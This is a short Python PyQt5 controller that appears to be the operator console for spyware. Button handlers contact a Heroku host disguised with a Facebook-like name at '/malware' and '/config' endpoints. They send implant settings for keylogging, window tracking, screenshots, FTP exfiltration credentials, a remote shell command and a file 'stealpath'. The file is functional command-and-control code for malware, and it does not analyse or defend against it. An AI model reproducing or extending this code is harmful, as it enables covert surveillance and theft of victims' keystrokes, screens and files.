from PyQt5.QtWidgets import QTableWidgetItem
from requests import get


class Controller:

    def __init__(self, gui):
        self.__gui = gui
        self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
        self.__configURL = 'http://facebook-user-profile.herokuapp.com/config'
        self.__gui.wakeup.clicked.connect(self.wakeup)
        self.__gui.sendconfig.clicked.connect(self.sendConfigData)


    def wakeup(self):
        response = get(self.__baseURL,params={'username':'pizdjec!'})
        data = response.json()
        print(data)



    def sendConfigData(self):
        config = {
            'debug' : self.__gui.debugmode.isChecked(),
            'keyloggingIsActive' : self.__gui.keylogger.isChecked(),
            'windowTrackingIsActive' : self.__gui.tracker.isChecked(),
            'samplingfrequency' : float(self.__gui.trackfreq.text()),
            'screenshotfrequency' : int(self.__gui.screenshotfreq.text()),
            'screenshottrigger' : self.__gui.triggers.text(),
            'baseurl' : self.__gui.baseurl.text(),
            'communicationfrequency' : int(self.__gui.commfreq.text()),
            'ftpurl' : self.__gui.ftpurl.text(),
            'ftpusername' : self.__gui.ftpuser.text(),
            'ftppassword' : self.__gui.ftppass.text(),
            'shellcommand' : self.__gui.shellcommand.text(),
            'stealpath' : self.__gui.filepath.text()
        }
        get(self.__configURL,config)



